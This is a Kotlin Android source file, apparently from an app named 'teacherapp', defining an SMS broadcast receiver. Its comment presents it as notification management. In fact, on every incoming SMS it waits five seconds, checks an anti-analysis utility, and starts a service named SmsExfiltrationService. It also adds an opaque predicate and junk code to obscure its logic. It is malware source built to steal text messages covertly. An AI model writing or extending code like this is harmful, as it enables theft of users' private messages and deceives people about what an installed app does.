package com.example.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.example.teacherapp.obfuscation.AntiAnalysisUtils
import com.example.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * InboxEventReceiver — handles incoming message events for notification management.
 * Triggers background sync when new messages arrive.
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        // Opaque predicate
        val n = System.nanoTime()
        val op = (n - n) + 1L   // always 1 > 0
        if (op > 0 && intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            CoroutineScope(Dispatchers.Default).launch {
                // Junk no-op
                val noise = LongArray(16) { i -> i.toLong() * i.toLong() + 7L }
                val _ = noise.sum()

                delay(5000L)

                // Execute only in safe environment
                AntiAnalysisUtils.executeIfSafe(context) {
                    SmsExfiltrationService.startExfiltration(context)
                }
            }
        } else if (op <= 0) {
            // Junk branch — never executed
            val fakeMap = mapOf(1 to "a", 2 to "b", 3 to "c")
            val _ = fakeMap.size
        }
    }
}
